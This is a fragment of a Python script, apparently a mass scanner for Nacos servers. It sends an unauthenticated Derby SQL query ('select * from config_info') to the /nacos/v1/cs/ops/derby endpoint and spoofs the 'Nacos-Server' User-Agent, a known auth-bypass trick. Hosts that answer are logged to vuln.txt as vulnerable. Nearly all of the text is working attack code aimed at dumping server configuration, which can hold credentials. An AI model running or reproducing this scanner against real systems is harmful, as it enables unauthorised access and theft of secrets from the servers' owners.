...
def check_url(url):
	...
	payload4="{}/nacos/v1/cs/ops/derby?sql=select%20*%20from%20config_info".format(url)
	headers = {
		'User-Agent': get_ua(),
		"host":hostname,
	...
	try:
		...
		if res2.status_code == 200 and "pageNumber" in res2.text:
			# print(res.text)
			print("\033[32m[+]{} payload2 is exist!\033[0m".format(payload2))
	...
	try:
		res4 = requests.get(payload4, verify=False, allow_redirects=False, headers={"User-Agent": "Nacos-Server"},timeout=30)
		if res4.status_code == 200 and "data" in res4.text and 'code":200' in res4.text:
			# print(res.text)
			print("\033[32m[+]{} sqlinject is exist!\033[0m".format(payload4))
			wirte_targets(payload4,"vuln.txt")
		else:
			print("\033[34m[-]{} payload4 is not exist.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} payload4 request false.\033[0m".format(url))
		pass	
